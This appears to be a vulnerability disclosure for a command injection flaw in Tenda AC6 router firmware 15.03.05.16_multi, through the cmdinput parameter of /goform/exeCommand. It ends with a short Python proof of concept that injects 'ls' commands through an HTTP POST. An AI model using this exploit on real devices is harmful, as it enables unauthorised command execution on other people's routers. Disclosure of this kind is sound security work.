# Command Injection Vulnerability in Tenda AC6 Firmware

## Vulnerability Overview
There is a **Command Injection** vulnerability in the **Tenda AC6 firmware version 15.03.05.16_multi**. The vulnerability exists in the **exeCommand** function of the firmware. Specifically, the **cmdinput** parameter, which is passed via HTTP, allows attackers to inject arbitrary commands into the system. This vulnerability allows attackers to execute arbitrary system commands, potentially gaining unauthorized access or causing other system misconfigurations.

The issue arises from improper sanitization of user-supplied input, where an attacker can exploit the **cmdinput** parameter to inject and execute arbitrary commands. For example, an attacker could inject commands like `ls` to list directories, or use other commands to read sensitive files or execute malicious actions remotely. ![Root Cause of Command Injection Vulnerability](images/1.png)

## Affected Versions
- Tenda AC6 Firmware version 15.03.05.16_multi

## Impact
- Command Injection
- Unauthorized access to the system
- Potential for information disclosure or system compromise


## Proof of Concept (PoC)

```python
import requests

host_port = "http://192.168.101.50:8008"
url = "/goform/exeCommand"

data = {
    "cmdinput": "ls; ls > /execcommand.txt;"  # Example command injection
}

response = requests.post(host_port + url, data=data)

# Print the response code and content
print("Response status code: ", response.status_code)
print("Response content: ", response.text)
